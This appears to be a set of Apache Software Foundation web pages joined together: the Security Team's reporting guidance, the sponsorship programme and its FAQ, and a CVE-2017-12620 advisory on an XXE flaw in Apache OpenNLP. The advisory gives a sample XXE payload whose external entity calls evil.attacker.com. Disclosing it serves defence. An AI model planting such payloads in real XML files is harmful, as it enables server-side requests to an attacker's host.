# ASF Security Team[¶](#asf-security-team "Permalink")

The Apache Security Team guides Apache projects on security issues
and coordinates the handling of all security vulnerabilities. The team
is a CVE Numbering Authority (CNA) covering all Apache projects and is
the only group able to allocate IDs to Apache Software Foundation project
issues. Advisories are published per project, and may be reviewed via
the [project advisories](https://security.apache.org/projects/).

## Reporting a vulnerability[¶](#reporting-a-vulnerability "Permalink")

We strongly encourage you to report potential security vulnerabilities to one of
our private security mailing lists first, before disclosing them in a
public forum.

A [list of security contacts for Apache projects](https://security.apache.org/projects/) is
available. If you can't find a project-specific security e-mail address and
you have an undisclosed security vulnerability to report, use
the general security address below.

**Only use the security contacts to report undisclosed security vulnerabilities in Apache projects and
manage the process of fixing such vulnerabilities. We cannot accept
regular bug reports or other security-related queries at these addresses.
We will ignore mail sent to these addresses that does not relate to an undisclosed
security problem in an Apache project.**

**Also note that the security team handles vulnerabilities in Apache projects,
not running ASF services. Send reports of vulnerabilities in ASF
services to root@apache.org. (This includes issues with apache.org websites)**

The general security mailing list address is:
security@apache.org. This is a private
mailing list.

Please send one plain-text, unencrypted, email for each vulnerability you are reporting. We may
ask you to resubmit your report if you send it as an image, movie, HTML, or
PDF attachment when you could as easily describe it with plain text.

## Issues not considered as security vulnerabilities[¶](#non-issues "Permalink")

These are things that we are well aware of, and have been reported to us many
times, but we do not class as a security vulnerability.
Please do not report them.

Issues not classed as security relevant:

* A lack of DMARC or SPF record on our domains
* "Clickjacking" on our domains
* Directory listings. These are deliberate and do not contain sensitive information
* Systems that disclose the versions of the servers and software we use
* Data that is publically accessible in our Jira bug tracking system

## Vulnerability Information[¶](#vulnerability-information "Permalink")

You can usually find information on known vulnerabilities for an Apache project on the project's web pages. For convenience, consult the [list of
security information pages for Apache projects](projects.html). If you can't find the information you are looking for on the
project's web site, ask your question on the project's `users` mailing list. Do **not** ask the security contacts directly about:

* how to configure the package securely
* whether a published vulnerability applies to specific versions of the Apache
  packages you are using
* whether a published vulnerability applies to the configuration of the Apache
  packages you are using
* obtaining further information on a published vulnerability
* the availability of patches and/or new releases to address a published
  vulnerability

The relevant project's `users` list is the place to ask such questions. The Apache Security Team and any project security
team will ignore any such questions you send directly to them.

## Vulnerability handling[¶](#vulnerability-handling "Permalink")

An overview of the vulnerability handling process is:

* The reporter reports the vulnerability privately to Apache.
* The appropriate project's security team works privately with the reporter
  to resolve the vulnerability.
* The project creates a new release of the package the vulnerability affects to deliver its fix.
* The project publicly announces the vulnerability and describes how to apply the fix.

Committers should read a [more detailed description of the process](committers.html). Reporters of security vulnerabilities may also find
it useful.

## Discussion[¶](#discussion "Permalink")

Committers and Security Researchers are encouraged to join our [community discuss list](https://lists.apache.org/list.html?security-discuss@community.apache.org).

# The Apache Software Foundation Sponsorship Program[¶](#the-apache-software-foundation-sponsorship-program "Permalink")

The Apache Software Foundation provides support for the Apache community of open-source software projects. Apache projects use a collaborative, consensus-based development process, an open and pragmatic software license, and a desire to create high quality software that leads the way in its field. We consider ourselves not simply a group of projects sharing a server, but rather a community of developers and users.

By sponsoring the ASF you show your support for our mission and help sustain a vibrant organization. Sponsorship also shows your support for open source and gives you the opportunity to "give back" to the community. Finally, since the ASF is a non-profit organization, sponsorship provides attractive tax benefits for organizations based in the U.S.

## Foundation Sponsorship[¶](#foundation-sponsorship "Permalink")

Foundation Sponsorship is the way that corporations can contribute substantially to the ongoing support of the Foundation. In return, the ASF will officially acknowledge your donation via various methods appropriate to your sponsorship level. We will display your logo and link on the Sponsors page and provide an official sponsor image to place on your website.

There are four sponsorship levels, defined by donation amount and in-return benefits of sponsorship. No more than 25% of value can be based on in-kind services. To get started, connect with fundraising@apache.org.

For non-sponsorship corporate contributions and individuals wishing to make a financial donation to the ASF, you may do so online at <https://donate.apache.org/> via credit/debit card, ACH bank payment, PayPal, and, using your mobile phone, with Apple Pay, Google Pay, and Microsoft Pay. Choose the “Individual and One-Time Corporate Donations (any amount)” option and follow the prompts to make a one-time or recurring (monthly, quarterly, or annually) contribution.

| Platinum[¶](#platinum "Permalink")  * Donation level: **US$125k**/year * Your logo (max size: 400x179) on our ASF Thanks page with rel="sponsored" link   + Logo location: top section of page   + Logo in rotating, random placement   + Logo in a two column row * Use of the ASF Platinum Sponsorship logo for your site * Joint press release or blog post with the ASF * Listed in ASF Annual Reports * Sponsor co-authored Case Study * “Success At Apache” Guest Post * Dedicated Sponsorship Ambassador * **NEW** ASF Community over Code Conference Sponsorship [Discounts](https://communityovercode.org/asf-sponsorship-discounts/) | Gold[¶](#gold "Permalink")  * Donation level: **US$50k**/year * Your logo (max size: 223x100) on our ASF Thanks page with rel="sponsored" link   + Logo location: upper-middle section of page   + Logo in alphabetical placement   + Logo in three column row * Use of the ASF Gold Sponsorship logo for your site * Personal quote for your press release * Listed in ASF Annual Reports * Sponsor co-authored Case Study * Dedicated Sponsorship Ambassador * **NEW** ASF Community over Code Conference Sponsorship [Discounts](https://communityovercode.org/asf-sponsorship-discounts/) |

## Targeted Sponsorship[¶](#targeted-sponsorship "Permalink")

Targeted Sponsorships benefit the ASF in addition to funding our general operations. Targeted Sponsors receive the [same benefits as Foundation Sponsors](https://apache.org/foundation/sponsorship.html#foundation-sponsorship) based on the equivalent value of the non-cash contribution. All Targeted Sponsorships (donated or in-kind products/solutions/services) must be pre-approved by the ASF (and/or the beneficiary Apache project, community, or activity) must be deemed essential in order to qualify for consideration for Targeted Sponsorship. Targeted Sponsorships require a minimum 3-year commitment to ensure funding continuity to support services provided. We invite you to [view our guidelines](https://apache.org/foundation/docs/targeted-sponsorship-policy.html) to see if Targeted Sponsorship is right for you.

## Corporate Giving Programs[¶](#corporate-giving-programs "Permalink")

The impact of your gift to the ASF as part of an annual corporate giving program bolsters the ASF’s mission. Corporate giving programs at Bloomberg, IBM, Microsoft, PayPal, Vanguard, and many others offer tax benefits, and provide their employees the ability to boost their support of a diverse set of nonprofit projects.

The ASF is an official charity in the Benevity Causes Portal, as part of numerous corporate giving initiatives such as The American Online Giving Foundation, the Microsoft Tech Talent for Good volunteer program and Charles Schwab Charitable. For more information, visit <https://www.benevity.com/>.

## FAQ[¶](#faq "Permalink")

### What is the ASF’s tax identification number?[¶](#what-is-the-asfs-tax-identification-number "Permalink")

The ASF's tax identification number is 47-0825376.

### Can I just make a one-time donation?[¶](#can-i-just-make-a-one-time-donation "Permalink")

The ASF appreciates donations of any size and, as we are a US registered 501(c)(3)
corporation, your donation may be tax deductible. If you are interested in
donating to the ASF at a different level than sponsorship, see our
[donation page](/foundation/contributing.html).

### Where can I mail a check?[¶](#where-can-i-mail-a-check "Permalink")

As of 1 November, 2024, we will no longer be accepting mailed-in donations using physical (paper) checks. To make a one-time or recurring donation to the ASF online using ACH (electronic money transfer) or eCheck (electronic check), please visit <https://donate.apache.org/>

and follow the prompts at “Individual and One-Time Corporate Donations (any amount)”. Here you may make a recurring (monthly, quarterly, or annually) donation as well.

We will issue you a tax receipt via email upon successful processing of your donation(s).

### Where will my sponsorship funds go?[¶](#where-will-my-sponsorship-funds-go "Permalink")

The ASF provides the infrastructure for hundreds of projects - the mailing lists, code repositories, bug tracking systems, etc. A few paid contractors, plus large amounts of volunteer effort, maintain these resources. This, in addition to the large costs of bandwidth and server hardware, constitutes the bulk of the expense of running the Foundation.

We also have the normal business operating expenses which go with any organization. These include:

* Infrastructure costs
* Legal and Accounting
* Marketing and PR
* Ongoing office expenses and administrative duties

Your sponsorship helps the ASF meet these expenses and
expand our capability to maintain our leadership in the developer and Open
Source communities. Funding lets us perform pro-active hardware
procurement, enhance our community outreach, sponsor developer hackathons
and user groups, and perform non-code related improvements to projects such
as better documentation and more comprehensive websites

### Who can sponsor the ASF?[¶](#who-can-sponsor-the-asf "Permalink")

From time to time there is confusion about who can sponsor the Apache Software Foundation.
Additionally, there are often inquiries from potential sponsors who are not committed
to the mission of the ASF or open source software.

Because The Apache Software Foundation Sponsorship Program needs to apply its policies quickly,
fairly and equally, without the need for exceptions or board votes, we have tried to
maintain this document at the most basic level. However, the Foundation reserves the right
to decline any sponsor without providing a reason and at our sole discretion.

In short, sponsors must be:

* A business located anywhere in the world that would be legal to operate anywhere in the United States and any state of nexus\* for the ASF, excluding businesses, persons and jurisdiction limited by law. This is necessary to avoid legal risks and protect our non-profit status.
* Demonstrably committed to open source software and The Foundation’s mission.

Landing pages for sponsor links cannot be advertisements or redirectors and must be “PG Rated” and safe for work environments. All links should go to a home page or a page with relevant, editorial content about open source software. Any sites with content unsuitable for minors must use a landing page that is completely kid-safe, with appropriate warnings, and that meets US legal requirements such as the FTC’s COPPA requirements.

\***Nexus**, also called “sufficient physical presence”, is a legal term that refers to the requirement for companies doing business in a state to collect and pay tax on sales in that state. For example, if you sell goods or services in Los Angeles, you must file and pay California state taxes. Source: <https://quickbooks.intuit.com/r/taxes/what-is-nexus-and-how-does-it-affect-your-small-business>.

### Is the Apache Software Foundation a non-profit organization?[¶](#is-the-apache-software-foundation-a-non-profit-organization "Permalink")

The Apache Software Foundation is a private operating foundation that is
registered as a non-profit, charitable organization under Section 501(c)(3)
of the U.S. Internal Revenue Code. This means that, for organizations within
the U.S., donations to the ASF should be tax-deductible. We are not
accountants, so this cannot be trusted as financial advice of any kind, but
we hope this description will be useful to those who advise you in these
matters. You may view our [ruling letter from the IRS acknowledging our
501(c)3 status](records/ASF-501c3.pdf).

You may review the latest financial filings and non-profit exemption
application of The Apache Software Foundation in our [public
records](records/) section. You may find other helpful information
through
[GuideStar](https://www.guidestar.org/profile/47-0825376)
(requires free registration for full access).

You can find more information about non-profits and related issues at the
[Internet Nonprofit Center](http://www.nonprofits.org/).

### Who can I talk to about supporting the ASF?[¶](#who-can-i-talk-to-about-supporting-the-asf "Permalink")

If you would like more information about supporting the ASF, please contact
fundraising@apache.org.
We handle sponsorship donations
differently from [standard non-directed donations](contributing.html),
so if you want your
donations to be part of the Sponsorship program (and thus obtain the
benefits of the program), coordinate the donation with the
Fundraising team. We keep all information in strictest confidence.

### How do sponsorship renewals happen?[¶](#how-do-sponsorship-renewals-happen "Permalink")

Your sponsorship runs for one year after the date of receipt of payment.
During this period, we display your logo on our [Sponsors](/foundation/thanks.html)
page.

Two months before the end of your sponsorship, we will contact you (via the
same mechanism we used to arrange the initial sponsorship) requesting
renewal. If renewal does not take place by the renewal date of the sponsorship,
the ASF may remove your logo from the thanks page.

Thanks for your support!

# CVE-2017-12620 - Apache OpenNLP XXE vulnerability

Severity: Medium

Vendor:
The Apache Software Foundation

Versions Affected:

* OpenNLP 1.5.0 to 1.5.3
* OpenNLP 1.6.0
* OpenNLP 1.7.0 to 1.7.2
* OpenNLP 1.8.0 to 1.8.1

Description:
When loading models or dictionaries that contain XML it is possible to
perform an XXE attack, since OpenNLP is a library, this only affects
applications that load models or dictionaries from untrusted sources.

Mitigation:
All users who load models or XML dictionaries from untrusted sources
should update to 1.8.2.

Example:

An attacker can place this:

```
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY sp SYSTEM "http://evil.attacker.com/">
]>
<r>&sp;</r>
```

Inside one of the XML files, either a dictionary or embedded inside a
model package, to demonstrate this vulnerability.

## Targeted Sponsors[¶](#targeted-sponsors "Permalink")

ASF Targeted Sponsors provide the Foundation with contributions for specific activities or programs, such as donating cloud services, funding a project hackathon, providing legal services, offering a community member benefit, underwriting expenses for our flagship event, or something entirely new. It's the Apache way of recognizing the sponsors that we rely on every day outside of and often in addition to funding our general operations.
